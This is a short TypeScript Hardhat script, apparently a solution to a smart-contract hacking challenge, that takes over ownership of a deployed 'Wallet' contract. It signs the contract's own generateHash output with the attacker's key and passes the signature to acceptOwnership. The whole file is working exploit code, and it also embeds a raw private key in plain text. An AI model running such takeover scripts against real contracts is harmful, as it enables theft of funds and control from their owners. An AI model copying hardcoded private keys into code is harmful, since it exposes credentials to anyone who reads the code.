import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { ETH_RPC } from '../secrets.config'

import * as dotenv from 'dotenv'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'
import { Wallet__factory } from '../typechain/factories/contracts/Wallet'
dotenv.config()

const instanceAddr = "0x1045F2a2A3D02B5686025372ca12c386D1759561"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function hack() {
  const signer = new ethers.Wallet("1d601a181721b4ee6e2c40ea05ff6b53e4efc35f584c39c5e004cc8a328c5c45", providerETH);
  const instanceContract = Wallet__factory.connect(instanceAddr, signer)

  const owner = await instanceContract.owner()
  console.log("current owner:", owner);

  const messageToSign = await instanceContract.generateHash(owner)
  console.log("message to sign:", messageToSign)

  const signature = await signer.signMessage(messageToSign)
  const splitSignature = ethers.utils.splitSignature(signature)
  console.log("split signature:", splitSignature);
  
  await (await instanceContract.acceptOwnership(splitSignature.v, splitSignature.r, splitSignature.s)).wait()
  console.log("current owner:", await instanceContract.owner());
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })